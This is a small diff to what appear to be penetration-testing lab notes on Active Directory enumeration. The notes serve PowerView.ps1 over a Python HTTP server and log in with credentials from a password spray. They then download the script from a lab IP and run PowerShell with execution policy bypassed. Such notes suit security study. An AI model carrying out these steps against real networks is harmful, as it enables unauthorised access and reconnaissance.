@@ -1029,9 +1029,11 @@ found here mark is pewned
 
 * Powerview
 ```console
-~$: cd /root/ADtools
+~$: in parrot
+cd /root/ADtools
  python3 -m http.server in the terminal and press Enter to start the HTTP server.
 open Remmina with credential opt from password spray technique 
+Then, open the Firefox browser and navigate to the URL http://10.10.1.13:8000/PowerView.ps1
 open powershell
 cd Downloads 
 Powershell -EP Bypass
